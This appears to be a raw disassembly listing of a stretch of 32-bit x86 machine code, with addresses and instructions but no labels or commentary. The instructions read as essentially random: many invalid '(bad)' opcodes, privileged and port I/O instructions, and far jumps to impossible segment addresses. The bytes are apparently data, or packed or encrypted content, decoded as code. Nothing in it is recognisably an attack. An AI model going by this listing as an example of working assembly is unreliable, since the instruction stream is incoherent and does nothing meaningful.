  420da2:	stos   DWORD PTR es:[edi],eax
  420da3:	and    BYTE PTR [ebp-0x1b0eb62f],ah
  420da9:	ret    
  420daa:	loopne 0x420dac
  420dac:	int    0xfd
  420dae:	hlt    
  420daf:	stc    
  420db0:	int    0x2a
  420db2:	into   
  420db3:	das    
  420db4:	aaa    
  420db5:	fidivr WORD PTR [esi+eax*4]
  420db8:	leave  
  420db9:	(bad)  [esi-0x53534898]
  420dbf:	mov    eax,ds:0x28830127
  420dc4:	dec    edx
  420dc5:	stos   BYTE PTR es:[edi],al
  420dc6:	repz mov ebx,0xd02f3d59
  420dcc:	and    DWORD PTR [esi],edi
  420dce:	mov    ah,0x67
  420dd0:	js     0x420d9d
  420dd2:	mov    DWORD PTR gs:[eax+0x36],edx
  420dd6:	test   al,0x6a
  420dd8:	sti    
  420dd9:	js     0x420def
  420ddb:	das    
  420ddc:	aad    0x48
  420dde:	les    edi,FWORD PTR [esi]
  420de0:	and    al,0x70
  420de2:	nop
  420de3:	add    esp,ecx
  420de5:	sbb    ebp,DWORD PTR [esi-0x2f]
  420de8:	stos   BYTE PTR es:[edi],al
  420de9:	and    BYTE PTR [ecx-0x9],cl
  420dec:	jmp    0x2957242
  420df1:	lahf   
  420df2:	and    eax,0x9725c8e5
  420df7:	push   eax
  420df8:	push   ebp
  420df9:	mov    ecx,0xc849bf6b
  420dfe:	jge    0x420dd1
  420e00:	ret    0x9c4b
  420e03:	or     al,0x77
  420e05:	xchg   ecx,eax
  420e06:	outs   dx,BYTE PTR gs:[esi]
  420e08:	das    
  420e09:	mov    WORD PTR [eax-0x3f850d04],ss
  420e0f:	loopne 0x420e35
  420e11:	or     DWORD PTR [ecx-0x2b],edi
  420e14:	cli    
  420e15:	adc    eax,0x2dadbc58
  420e1a:	repnz mov bh,0xc5
  420e1d:	inc    esi
  420e1e:	popa   
  420e1f:	sub    DWORD PTR [eax-0x67],edx
  420e22:	mov    dh,0x89
  420e24:	xchg   BYTE PTR ds:0x65f2056a,cl
  420e2a:	mov    ds:0xa10ea2c6,al
  420e2f:	shr    BYTE PTR [eax+0x6a],cl
  420e32:	scas   al,BYTE PTR es:[edi]
  420e33:	or     eax,0xeb4f74c2
  420e38:	mov    dh,0xb4
  420e3a:	push   esi
  420e3b:	jge    0x420e99
  420e3d:	xlat   BYTE PTR ds:[ebx]
  420e3e:	shr    dh,0xda
  420e41:	fistp  WORD PTR ds:0xc34bb616
  420e47:	add    ebp,edx
  420e49:	daa    
  420e4a:	push   ds
  420e4b:	stos   BYTE PTR es:[edi],al
  420e4c:	dec    esp
  420e4d:	popf   
  420e4e:	outs   dx,DWORD PTR ds:[esi]
  420e4f:	pop    esi
  420e50:	je     0x420eb6
  420e52:	(bad)  
  420e53:	cmp    al,0x22
  420e55:	jb     0x420df4
  420e57:	inc    ecx
  420e58:	add    BYTE PTR [ecx-0x27],0x88
  420e5c:	fwait
  420e5d:	jb     0x420dee
  420e5f:	jnp    0x420e73
  420e61:	mov    al,ds:0xb8183d6e
  420e66:	call   0x93b9:0xcb038b70
  420e6d:	pop    ecx
  420e6e:	dec    edi
  420e6f:	xor    DWORD PTR [edx],edx
  420e71:	stos   DWORD PTR es:[edi],eax
  420e72:	jb     0x420e10
  420e74:	mov    ds:0xde398e31,al
  420e79:	test   DWORD PTR [eax+0x15292292],eax
  420e7f:	xchg   ebx,eax
  420e80:	aad    0x26
  420e82:	jmp    0x7f9b:0xaf0378c7
  420e89:	fstp   QWORD PTR [eax+0x74b9fd5a]
  420e8f:	sbb    ebp,ebx
  420e91:	iret   
  420e92:	cmp    al,dl
  420e94:	pop    ecx
  420e95:	out    0x9b,eax
  420e97:	retf   
  420e98:	pop    esp
  420e99:	imul   esp,DWORD PTR [esi+0x3d],0x79
  420e9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e9e:	and    BYTE PTR [bp+di-0x44],cl
  420ea2:	xchg   ebx,eax
  420ea3:	cdq    
  420ea4:	das    
  420ea5:	rcl    BYTE PTR [eax+0x15],cl
  420ea8:	scas   al,BYTE PTR es:[edi]
  420ea9:	xor    eax,DWORD PTR [edi+0xd]
  420eac:	out    dx,al
  420ead:	bound  edi,QWORD PTR [ebp+0x77fd4bde]
  420eb3:	add    DWORD PTR [eax],ebp
  420eb5:	in     eax,dx
  420eb6:	xor    DWORD PTR [edi+0x5a46bf4f],ecx
  420ebc:	test   ch,dh
  420ebe:	push   esp
  420ebf:	jno    0x420e60
	...
  421095:	retf   0xe76a
  421098:	ja     0x421081
  42109a:	(bad)  
  42109b:	(bad)  
  42109d:	daa    
  42109e:	inc    ebx
  42109f:	call   0x8cb7951e
  4210a4:	and    bl,BYTE PTR [ebx+0x200001d3]
  4210aa:	pop    es
  4210ab:	add    BYTE PTR [eax],al
  4210ad:	xchg   esp,eax
  4210ae:	jnp    0x421048
  4210b0:	fs jge 0x421045
  4210b3:	pop    eax
  4210b4:	scas   al,BYTE PTR es:[edi]
  4210b5:	setle  BYTE PTR [edx+0x541c8e45]
  4210bc:	xor    DWORD PTR ds:0x9b577b0a,ecx
  4210c2:	push   ecx
  4210c3:	nop
  4210c4:	fnstenv [ecx+0x42ee5002]
  4210ca:	dec    edi
  4210cb:	cmp    BYTE PTR [edx],cl
  4210cd:	jnp    0x4210d9
  4210cf:	jo     0x421147
  4210d1:	repnz sub cl,BYTE PTR [ebx-0x569a2752]
  4210d8:	daa    
  4210d9:	xchg   DWORD PTR [ebp-0x54],ebp
  4210dc:	mov    dh,0x9b
  4210de:	jae    0x4210cb
  4210e0:	adc    ah,BYTE PTR [edx-0x27372726]
  4210e6:	mov    ds,edi
  4210e8:	and    DWORD PTR [eax+0x68],edx
  4210eb:	add    al,bh
  4210ed:	lock sub eax,0x5c4e1edc
  4210f3:	jbe    0x4210b9
  4210f5:	jnp    0x4210db
  4210f7:	shl    BYTE PTR [ebx+ebx*4-0x228752d0],0x37
  4210ff:	out    0x2,eax
  421101:	jl     0x4210da
  421103:	iret   
  421104:	retf   0x45a0
  421107:	scas   eax,DWORD PTR es:[edi]
  421108:	test   eax,0x1f498737
  42110d:	sahf   
  42110e:	xchg   DWORD PTR [ebp-0x2b],ebx
  421111:	xchg   ecx,eax
  421112:	or     esi,DWORD PTR [eax+ebp*8-0x1bb73cf0]
  421119:	inc    esp
  42111a:	data16 sub dl,BYTE PTR [ecx+0x78]
  42111e:	clc    
  42111f:	mov    DWORD PTR [edx+ebp*1-0x59],esp
  421123:	repnz fdiv QWORD PTR [ecx]
  421126:	inc    eax
  421127:	or     dh,BYTE PTR [edi-0x596fc2e8]
  42112d:	imul   ebp,DWORD PTR [edx-0x11056f32],0xffffffd3
  421134:	bound  ecx,QWORD PTR [edx+0x0]
  421137:	cld    
  421138:	add    ecx,DWORD PTR [edi+0x6ab1c373]
  42113e:	lahf   
  42113f:	bound  eax,QWORD PTR [esi-0x1e0d4c17]
  421145:	inc    ebx
  421146:	add    bl,BYTE PTR [ebx+0x1eccddff]
  42114c:	out    0x5f,eax
  42114e:	dec    ebx
  42114f:	cmp    BYTE PTR ds:0xeae93257,ch
  421155:	xchg   DWORD PTR [ebx],ebx
  421157:	shl    bh,cl
  421159:	and    al,0x6c
  42115b:	xchg   ebp,eax
  42115c:	sub    ebx,esp
  42115e:	pop    ss
  42115f:	rol    BYTE PTR [ebx+0x13],1
  421162:	dec    ebp
  421163:	(bad)  
  421164:	sbb    dl,BYTE PTR [ebp+0x58]
  421167:	shl    BYTE PTR [edx],1
  421169:	jp     0x421164
  42116b:	(bad)  
  42116c:	fld    TBYTE PTR [ebx]
  42116e:	cmp    al,0xc7
  421170:	dec    ebp
  421171:	iret   
  421172:	inc    ebp
  421173:	xchg   ebp,eax
  421174:	call   0x652c3939
  421179:	adc    ah,bh
  42117b:	jbe    0x421128
  42117d:	les    esp,FWORD PTR [ebp+0x2f]
  421180:	les    ebp,FWORD PTR [ecx+eax*2-0x4c]
  421184:	dec    ecx
  421185:	cmp    esi,edi
  421187:	bound  ecx,QWORD PTR [ecx]
  421189:	repz pop ss
  42118b:	jmp    0x3d9bab3e
  421190:	mov    dl,0xc6
  421192:	bound  edi,QWORD PTR [eax-0x6d9b371b]
  421198:	(bad)  
  421199:	xor    ecx,DWORD PTR [ebx]
  42119b:	cdq    
  42119c:	aaa    
  42119d:	push   ss
  42119e:	sub    eax,0x808319dd
  4211a3:	pop    eax
  4211a4:	inc    ebx
  4211a5:	les    edi,FWORD PTR [edi]
  4211a7:	xchg   ecx,eax
  4211a8:	pusha  
  4211a9:	xor    al,0x79
  4211ab:	mov    dl,0x55
  4211ad:	push   es
  4211ae:	in     al,dx
  4211af:	das    
  4211b0:	mov    cl,0x4b
  4211b2:	xchg   DWORD PTR [eax+eiz*1],edx
  4211b5:	sbb    BYTE PTR [edx-0x4a83dc8],bh
  4211bb:	loop   0x4211df
  4211bd:	aas    
  4211be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211bf:	push   ss
  4211c0:	jbe    0x4211ec
  4211c2:	xlat   BYTE PTR ds:[ebx]
  4211c3:	stos   BYTE PTR es:[edi],al
  4211c4:	mov    esi,0xbdb997a7
  4211c9:	inc    ebp
  4211ca:	je     0x4211bf
  4211cc:	pusha  
  4211cd:	call   0x7446c396
  4211d2:	repnz mov ah,0x32
  4211d5:	inc    esi
  4211d6:	sub    eax,0xae52b788
  4211db:	mov    ds:0xc843449b,al
  4211e0:	adc    ch,BYTE PTR [ebx]
  4211e2:	push   esp
  4211e3:	dec    ecx
  4211e4:	add    eax,0x3f7dd97d
  4211e9:	out    0x95,al
  4211eb:	(bad)  
  4211ed:	xor    dl,BYTE PTR [ebx-0x6d]
  4211f0:	dec    edi
  4211f1:	jg     0x42125e
  4211f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211f4:	call   0xece6:0x28ef2995
  4211fb:	jno    0x42122e
  4211fd:	call   0x8ae:0xb19336e
  421204:	mov    ebp,0x35b7a43c
  421209:	mov    ecx,fs
  42120b:	clc    
  42120c:	inc    ebx
  42120d:	aaa    
  42120e:	scas   eax,DWORD PTR es:[edi]
  42120f:	jno    0x421272
  421211:	push   edi
  421212:	vcmpss xmm5,xmm5,xmm1,0xf2
  421217:	test   DWORD PTR [eax],0xf164f7f1
  42121d:	rcr    BYTE PTR [esp+ebx*4-0x1b],1
  421221:	rol    BYTE PTR [edi+0x41],1
  421224:	and    esi,DWORD PTR [ebx-0x20]
  421227:	push   0xffffffaa
  421229:	inc    edi
  42122a:	jmp    DWORD PTR [esi+0x2cb7ffce]
  421230:	xchg   esi,eax
  421231:	ror    BYTE PTR [edx],1
  421233:	fist   DWORD PTR [edi+edx*1+0x24311490]
  42123a:	adc    edi,DWORD PTR [edi-0x6d]
  42123d:	fwait
  42123e:	shl    BYTE PTR [edx],cl
  421240:	push   esp
  421241:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421242:	push   ss
  421243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421244:	(bad)  
  421245:	pop    ecx
  421246:	lods   eax,DWORD PTR ds:[esi]
  421247:	mov    eax,0x7eb7698e
  42124c:	add    BYTE PTR [ecx+0x70],cl
  42124f:	jbe    0x421215
  421251:	(bad)  
  421252:	aam    0x4b
  421254:	sbb    BYTE PTR [ecx],0x75
  421257:	in     al,dx
  421258:	or     BYTE PTR [esi-0x2f69d35e],ch
  42125e:	fist   DWORD PTR [esi+0x19d7268e]
  421264:	sub    BYTE PTR [eax+esi*4-0x16],dh
  421268:	xchg   DWORD PTR [ebx-0x76],edi
  42126b:	dec    edi
  42126c:	mov    al,0x50
  42126e:	xchg   edi,eax
  42126f:	add    ecx,DWORD PTR [ecx]
  421271:	iret   
  421272:	test   eax,0xc9c7177f
  421277:	fcomp  DWORD PTR [esi+0x55]
  42127a:	dec    edx
  42127b:	or     eax,0x55dbfb39
  421280:	cmp    ebx,DWORD PTR [edi+0x73]
  421283:	xor    BYTE PTR [ecx],bl
  421285:	xlat   BYTE PTR ds:[ebx]
  421286:	lea    ebx,[edi]
  421288:	cwde   
  421289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42128a:	xlat   BYTE PTR ds:[ebx]
  42128b:	xchg   BYTE PTR ss:[edi-0x4d7a2cc4],cl
  421292:	les    esi,FWORD PTR [edx+0x53]
  421295:	or     BYTE PTR ss:[ebp-0x58],bl
  421299:	mov    ebx,0x28190bba
  42129e:	data16 mov bl,0x1f
  4212a1:	adc    ah,BYTE PTR [eax-0x70]
  4212a4:	mov    ds:0x90810ab4,eax
  4212a9:	jge    0x421291
  4212ab:	mov    DWORD PTR [eax-0x5cbe14f0],ebp
  4212b1:	dec    edx
  4212b2:	out    0xc1,eax
  4212b4:	out    0x44,al
  4212b6:	or     DWORD PTR [edx+0x12a0e26d],eax
  4212bc:	pop    esp
  4212bd:	imul   eax,DWORD PTR [edx-0x2d],0xcbfd3bc6
  4212c4:	lods   al,BYTE PTR ds:[esi]
  4212c5:	sub    DWORD PTR [ebx+edx*4+0x1e],ecx
  4212c9:	jle    0x421340
  4212cb:	push   ebp
  4212cc:	cmp    al,BYTE PTR [ecx-0x59]
  4212cf:	sar    DWORD PTR [esi+0x7d07f1ac],0x82
  4212d6:	cmp    al,0x98
  4212d8:	enter  0x3c96,0x23
  4212dc:	jl     0x4212ec
  4212de:	cwde   
  4212df:	cli    
  4212e0:	pop    es
  4212e1:	sub    DWORD PTR [edx-0x43296804],esp
  4212e7:	in     al,0x53
  4212e9:	add    eax,0x7c6c1063
  4212ee:	sub    eax,0xa82ac4a5
  4212f3:	jno    0x4212df
  4212f5:	sti    
  4212f6:	addr16 (bad) 
  4212f8:	mov    gs,WORD PTR [ecx+0x5eea7393]
  4212fe:	fdecstp 
  421300:	inc    edx
  421301:	pop    ss
  421302:	adc    eax,0x54f8ff40
  421307:	or     BYTE PTR [ebx],al
  421309:	cmp    DWORD PTR [edx+0x37],edx
  42130c:	out    dx,al
  42130d:	mov    ds:0x3aa7e3a0,eax
  421312:	adc    eax,0xb7cb7fac
  421317:	into   
  421318:	inc    edi
  421319:	or     BYTE PTR [edi],cl
  42131b:	sti    
  42131c:	add    BYTE PTR es:[ecx+ebp*1-0x299818ce],bl
  421324:	or     al,0x4c
  421326:	arpl   di,dx
  421328:	imul   ebx,eax,0x15
  42132b:	mov    eax,0x100ffacb
  421330:	imul   edi,ecx,0x17ed895f
  421336:	xor    eax,0x2c5998c3
  42133b:	sub    ecx,DWORD PTR [eax+0xb250e58]
  421341:	or     eax,0x910c26c0
  421346:	sbb    edi,edx
  421348:	sahf   
  421349:	mov    dl,0x13
  42134b:	push   esi
  42134c:	in     eax,dx
  42134d:	xor    BYTE PTR [edx-0x3468a14e],0xf1
  421354:	push   edx
  421355:	fsubp  st(2),st
  421357:	cmc    
  421358:	js     0x421377
  42135a:	test   DWORD PTR [ecx*4+0x374982c2],eax
  421361:	not    bh
  421363:	push   esp
  421364:	(bad)  
  421365:	adc    al,0xa0
  421367:	xor    al,0x19
  421369:	add    edx,DWORD PTR [ebx-0x36]
  42136c:	pop    edi
  42136d:	cdq    
  42136e:	pop    ebx
  42136f:	sub    ebp,esp
  421371:	mov    dh,0x43
  421373:	lods   al,BYTE PTR ds:[esi]
  421374:	pop    esp
  421375:	ins    BYTE PTR es:[edi],dx
  421376:	fldenv [esi+ebx*1-0x41e8fcbb]
  42137d:	fwait
  42137e:	imul   edx,DWORD PTR [edx+0x6b],0x55d5533b
  421385:	dec    DWORD PTR [esi+0x56]
  421388:	loopne 0x421372
  42138a:	push   ebx
  42138b:	(bad)  
  42138c:	rcl    DWORD PTR [edi],0x97
  42138f:	dec    esi
  421390:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421391:	js     0x42136a
  421393:	fldcw  WORD PTR [eax-0x27]
  421396:	(bad)  
  421397:	jne    0x4213c5
  421399:	out    dx,al
  42139a:	sbb    eax,0x1172c8e4
  42139f:	loopne 0x4213ae
  4213a1:	loop   0x4213fb
  4213a3:	add    BYTE PTR [ecx+0x96869fb],ah
  4213a9:	retf   
  4213aa:	shr    DWORD PTR [ecx-0x6838e20f],0xe8
  4213b1:	push   0xffffffef
  4213b3:	xor    edx,DWORD PTR [ebx]
  4213b5:	adc    BYTE PTR [edi-0x4b],ah
  4213b8:	sub    eax,0xe3185e8f
  4213bd:	in     eax,0x4c
  4213bf:	push   0x1d
  4213c1:	push   0xffffff94
  4213c3:	and    BYTE PTR [ecx+0x44595858],cl
  4213c9:	nop
  4213ca:	ja     0x421443
  4213cc:	xor    eax,0xee61e9d7
  4213d1:	into   
  4213d2:	ins    BYTE PTR es:[edi],dx
  4213d3:	xor    BYTE PTR [esi+0x36],dl
  4213d6:	mov    al,0xcd
  4213d8:	outs   dx,DWORD PTR ds:[esi]
  4213d9:	push   es
  4213da:	mov    cl,0x4e
  4213dc:	push   edi
  4213dd:	mov    ebx,0x3b34fe69
  4213e2:	dec    edx
  4213e3:	add    ebx,DWORD PTR [edx]
  4213e5:	jno    0x421443
  4213e7:	outs   dx,BYTE PTR ds:[esi]
  4213e8:	arpl   WORD PTR [ecx+0x3a48c9c4],sp
  4213ee:	in     al,dx
  4213ef:	xchg   BYTE PTR [ecx+eax*4+0x9de4268],dh
  4213f6:	inc    esp
  4213f7:	jecxz  0x421450
  4213f9:	jbe    0x4213be
  4213fb:	xor    bh,BYTE PTR [eax+0x19]
  4213fe:	xchg   esi,eax
  4213ff:	pop    eax
  421400:	add    bh,BYTE PTR [ebx]
  421402:	wbinvd 
  421404:	hlt    
  421405:	xchg   esp,eax
  421406:	inc    ebx
  421407:	cli    
  421408:	inc    esi
  421409:	mov    gs,WORD PTR [edi]
  42140b:	ins    BYTE PTR es:[edi],dx
  42140c:	push   cs
  42140d:	mov    bh,0xf0
  42140f:	mov    ah,0xc8
  421411:	xchg   edx,eax
  421412:	fild   DWORD PTR ds:0xd7406303
  421418:	idiv   DWORD PTR [eax+edi*4+0x63]
  42141c:	cmp    eax,0xdf58d80b
  421421:	sub    WORD PTR [ebx+0x4bd18d97],si
  421428:	test   BYTE PTR [edi+eiz*8],0x70
  42142c:	fsubr  DWORD PTR [eax-0x6d1ec4c9]
  421432:	das    
  421433:	sub    DWORD PTR [ebx+0x5a1cc7c7],esi
  421439:	(bad)  
  42143a:	add    eax,DWORD PTR ds:0x4ddb784e
  421440:	fadd   QWORD PTR [eax+edx*8-0x303a9f44]
  421447:	mov    fs,WORD PTR [esi-0x80]
  42144a:	or     al,dl
  42144c:	pushf  
  42144d:	enter  0xeced,0xda
  421451:	imul   ecx,ebx,0x32
  421454:	xchg   esp,eax
  421455:	sub    eax,0xc5762966
  42145a:	cmp    eax,0x197efa14
  42145f:	and    DWORD PTR [edx],ebx
  421461:	lock push 0x14ccc68c
  421467:	xchg   edx,eax
  421468:	repnz pop ds
  42146a:	jp     0x4214b3
  42146c:	lods   al,BYTE PTR ds:[esi]
  42146d:	sbb    esi,DWORD PTR [ebx]
  42146f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421470:	push   ss
  421471:	retf   
  421472:	aad    0x39
  421474:	mov    esi,0xeaf986c
  421479:	inc    ebp
  42147a:	jne    0x421406
  42147c:	adc    esp,DWORD PTR [eax]
  42147e:	inc    esp
  42147f:	jmp    0xae76bccf
  421484:	rol    ebx,1
  421486:	cmp    eax,ebx
  421488:	push   edx
  421489:	mov    BYTE PTR [edx+0x2a0c751b],0x3b
  421490:	mov    ah,0x23
  421492:	int3   
  421493:	rol    dh,1
  421495:	retf   
  421496:	retf   0xcd9e
  421499:	xchg   ebp,eax
  42149a:	js     0x42142b
  42149c:	xor    ebx,ecx
  42149e:	(bad)
  4214a1:	inc    esp
  4214a2:	dec    ebx
  4214a3:	xchg   ah,bl
  4214a5:	jg     0x421453
  4214a7:	popa   
  4214a8:	aam    0xa9
  4214aa:	inc    edx
  4214ab:	sahf   
  4214ac:	enter  0x367e,0x38
  4214b0:	mov    cl,0x29
  4214b2:	fwait
  4214b3:	shl    DWORD PTR [eax+eiz*1-0x54a29316],cl
  4214ba:	jge    0x421449
  4214bc:	pop    edi
  4214bd:	pop    eax
  4214be:	fsub   DWORD PTR [edi-0x33]
  4214c1:	push   esi
  4214c2:	and    bl,ah
  4214c4:	out    dx,eax
  4214c5:	add    al,0x5b
  4214c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214c8:	adc    edx,edx
  4214ca:	push   esi
  4214cb:	aam    0xa0
  4214cd:	sbb    dh,al
  4214cf:	jl     0x42146f
  4214d1:	cmp    eax,0x12a9edaa
  4214d6:	xchg   DWORD PTR [ebp-0x46],eax
  4214d9:	rcr    bl,1
  4214db:	mov    dl,0x51
  4214dd:	fild   DWORD PTR [ebx-0x37ffca96]
  4214e3:	push   eax
  4214e4:	jns    0x421515
  4214e6:	(bad)  
  4214e7:	scas   eax,DWORD PTR es:[edi]
  4214e8:	std    
  4214e9:	or     eax,0xb25e912a
  4214ee:	hlt    
  4214ef:	xor    al,0x38
  4214f1:	jle    0x42151e
  4214f3:	clc    
  4214f4:	shr    BYTE PTR [esi-0x53c58c41],cl
  4214fa:	outs   dx,BYTE PTR ds:[esi]
  4214fb:	or     eax,0x9cd95891
  421500:	and    al,BYTE PTR [edx+0x15f103c2]
  421506:	xor    ebx,0xffffffbf
  421509:	and    ebx,esp
  42150b:	aad    0xdd
  42150d:	sbb    eax,0xda2ff32a
  421512:	in     al,0x69
  421514:	add    bh,cl
  421516:	xor    dh,BYTE PTR [edi-0x59]
  421519:	test   BYTE PTR [edi+0x1ea34054],bl
  42151f:	ret    
  421520:	test   eax,0x23797524
  421525:	cs xchg edi,eax
  421527:	push   0xf68d1878
  42152c:	or     esi,DWORD PTR [eax]
  42152e:	xchg   edx,eax
  42152f:	mov    eax,0xa06cc66c
  421534:	mov    ch,0x25
  421537:	in     eax,dx
  421538:	in     eax,0x4
  42153a:	adc    eax,0xa3a2c099
  42153f:	dec    esp
  421540:	int3   
  421541:	dec    ebp
  421542:	and    DWORD PTR [ebx+0x9a0df58],0x23
  421549:	test   al,0x55
  42154b:	cmp    eax,DWORD PTR ds:0xbabe6031
  421551:	ds push ecx
  421553:	jne    0x42152c
  421555:	pop    ss
  421556:	mov    bl,0xd8
  421558:	scas   eax,DWORD PTR es:[edi]
  421559:	mov    dl,0x7c
  42155b:	mov    cl,0xfa
  42155d:	push   ss
  42155e:	xor    BYTE PTR [ebx],cl
  421560:	daa    
  421561:	cmp    bl,BYTE PTR [ebx+0x37850e83]
  421567:	into   
  421568:	mov    dl,0x42
  42156a:	cmp    eax,0xeeda8d59
  42156f:	ins    BYTE PTR es:[edi],dx
  421570:	into   
  421571:	repz popa 
  421573:	mov    BYTE PTR [edx],dh
  421575:	sub    dh,BYTE PTR [ebx]
  421577:	out    dx,eax
  421578:	fdiv   st(3),st
  42157a:	push   cs
  42157b:	cdq    
  42157c:	icebp  
  42157d:	mov    al,0x62
  42157f:	add    BYTE PTR [ebx-0x664450bc],cl
  421585:	shl    BYTE PTR [edx-0x56],1
  421588:	pop    ecx
  421589:	stos   DWORD PTR es:[edi],eax
  42158a:	sbb    BYTE PTR [ebx+0x18],dh
  42158d:	adc    al,0x3
  42158f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421590:	(bad)  
  421591:	in     eax,0x3c
  421593:	cmc    
  421594:	aaa    
  421595:	xor    dh,BYTE PTR [esp+ecx*4-0x76]
  421599:	or     bl,BYTE PTR [ecx+0x3b0b0fe5]
  42159f:	mov    ah,0xba
  4215a1:	xlat   BYTE PTR ds:[ebx]
  4215a2:	aaa    
  4215a3:	sbb    ch,bl
  4215a5:	lahf   
  4215a6:	xchg   esp,eax
  4215a7:	xchg   esp,eax
  4215a8:	cmp    edx,DWORD PTR [eax-0x3e899310]
  4215ae:	aam    0xd1
  4215b0:	outs   dx,DWORD PTR ds:[esi]
  4215b1:	in     al,0x61
  4215b3:	lods   al,BYTE PTR ds:[esi]
  4215b4:	fcmovne st,st(2)
  4215b6:	rcr    BYTE PTR fs:[esi+0x2dd6ce29],0xc3
  4215be:	cld    
  4215bf:	adc    ecx,edx
  4215c1:	xor    al,0xf0
  4215c3:	repz jge 0x42159f
  4215c6:	aaa    
  4215c7:	ror    BYTE PTR [edi+edx*4],cl
  4215ca:	(bad)  
  4215cb:	scas   al,BYTE PTR es:[edi]
  4215cc:	mov    ch,0xde
  4215ce:	addr16 aaa 
  4215d0:	loope  0x421639
  4215d2:	jmp    0x5ba7:0x220dc224
  4215d9:	ins    BYTE PTR es:[edi],dx
  4215da:	retf   
  4215db:	dec    eax
  4215dc:	shr    esi,cl
  4215de:	ja     0x421572
  4215e0:	add    cl,BYTE PTR [eax]
  4215e2:	pop    ebp
  4215e3:	retf   
  4215e4:	pushf  
  4215e5:	addr16 jns 0x42160d
  4215e8:	lahf   
  4215e9:	js     0x4215dd
  4215eb:	leave  
  4215ec:	lea    ebp,[eax-0x7bdb9ca1]
  4215f2:	cmp    ch,cl
  4215f4:	xchg   esi,eax
  4215f5:	dec    eax
  4215f6:	mov    ds:0xcdb3b291,al
  4215fb:	cld    
  4215fc:	cs imul ebp,esp,0x81ad08a3
  421603:	jns    0x42163c
  421605:	xchg   BYTE PTR [ebp+eax*8-0x12],al
  421609:	icebp  
  42160a:	and    dh,BYTE PTR [edi+esi*1]
  42160d:	cs mov dl,0x28
  421610:	les    ebp,FWORD PTR [edi-0x37]
  421613:	xchg   ebx,eax
  421614:	test   al,0xbc
  421616:	xchg   edx,eax
  421617:	jecxz  0x4215cb
  421619:	mov    esi,0xf652ccd1
  42161e:	jle    0x421660
  421620:	add    edx,DWORD PTR [ecx+0x4649e659]
  421626:	inc    ecx
  421627:	dec    esp
  421628:	in     al,dx
  421629:	ins    DWORD PTR es:[edi],dx
  42162a:	in     al,dx
  42162b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42162c:	sub    DWORD PTR [edi],esp
  42162e:	inc    ebp
  42162f:	daa    
  421630:	out    dx,al
  421631:	sub    DWORD PTR [eax-0x18],ebx
  421634:	pop    ebp
  421635:	fisub  DWORD PTR [edx+eax*1]
  421638:	xchg   BYTE PTR [edx],dh
  42163a:	gs pop eax
  42163c:	aaa    
  42163d:	in     eax,dx
  42163e:	push   cs
  42163f:	mov    ds:0x7e77d3da,al
  421644:	dec    ebp
  421645:	ds call 0x33544087
  42164b:	xchg   ebx,eax
  42164c:	push   esp
  42164d:	xchg   edx,eax
  42164e:	jns    0x421615
  421650:	push   ecx
  421651:	ins    DWORD PTR es:[edi],dx
  421652:	gs xchg ebx,eax
  421654:	jmp    0x656f:0xb139a037
  42165b:	gs push ss
  42165d:	sbb    al,0x51
  42165f:	lea    esi,[eax+0x34a69f80]
  421665:	sub    DWORD PTR [ecx+0x3e],ebp
  421668:	or     al,0x55
  42166a:	cmp    BYTE PTR [ebx],ah
  42166c:	sbb    al,0xb9
  42166e:	fnstsw WORD PTR [edx+0x4d309a5a]
  421674:	mov    eax,0x88b1378b
  421679:	test   eax,0x14df9cad
  42167e:	ffreep st(5)
  421680:	mov    bh,0x7d
  421682:	les    ecx,FWORD PTR [ebp-0x76190857]
  421688:	out    dx,al
  421689:	lods   al,BYTE PTR ds:[esi]
  42168a:	aas    
  42168b:	xchg   ebx,eax
  42168c:	sbb    al,0xe9
  42168e:	ficomp DWORD PTR [eax-0x66]
  421691:	scas   eax,DWORD PTR es:[edi]
  421692:	adc    DWORD PTR [edx],0xea6a6e0
  421698:	or     bl,al
  42169a:	and    DWORD PTR [edi-0x74],edx
  42169d:	aam    0x15
  42169f:	cmp    DWORD PTR [edi+ecx*1-0x77],ecx
  4216a3:	ins    BYTE PTR es:[edi],dx
  4216a4:	(bad)  
  4216a5:	cwde   
  4216a6:	inc    edi
  4216a7:	inc    esp
  4216a8:	stc    
  4216a9:	jne    0x4216c7
  4216ab:	push   esp
  4216ac:	adc    dh,BYTE PTR fs:[ebp-0x38]
  4216b0:	jge    0x421707
  4216b2:	adc    BYTE PTR [ebx+0x0],dl
  4216b5:	retf   0x216f
  4216b8:	fs push ebp
  4216ba:	push   eax
  4216bb:	mov    edi,0x316dc8a7
  4216c0:	mov    eax,ds:0xe8e83d9d
  4216c5:	test   al,0x8a
  4216c7:	mov    edx,0x5b54c199
  4216cc:	mov    cl,0x62
  4216ce:	add    edx,DWORD PTR [ebx+0x424ffa2e]
  4216d4:	jp     0x42168d
  4216d6:	xor    eax,0x676dd92d
  4216db:	mov    dh,0x4a
  4216dd:	out    dx,eax
  4216de:	mov    ebx,DWORD PTR [eax-0x23337c48]
  4216e4:	mov    cl,0x58
  4216e6:	jmp    0xbb81:0x5a8b8b9c
  4216ed:	push   ecx
  4216ee:	sbb    al,0x62
  4216f0:	inc    esp
  4216f1:	adc    DWORD PTR [edx],edi
  4216f3:	je     0x42167b
  4216f5:	mov    bl,0xe1
  4216f7:	and    eax,0x654027f5
  4216fc:	push   0x391e9ee9
  421701:	retf   
  421702:	es jno 0x4216cc
  421705:	mov    eax,0x230140d3
  42170a:	outs   dx,DWORD PTR ds:[esi]
  42170b:	jmp    0xa4e:0x36d37521
  421712:	xchg   edi,eax
  421713:	jnp    0x4216e4
  421715:	ds into 
  421717:	popa   
  421718:	pop    edx
  421719:	push   ss
  42171a:	xor    DWORD PTR [ecx],esi
  42171c:	xor    bl,BYTE PTR [eax-0x1d]
  42171f:	ss xchg esi,eax
  421721:	loopne 0x421741
  421723:	dec    esp
  421724:	sub    cl,BYTE PTR [ebx-0x6dadb14a]
  42172a:	je     0x42174f
  42172c:	jge    0x4216f4
  42172e:	jae    0x421794
  421730:	scas   al,BYTE PTR es:[edi]
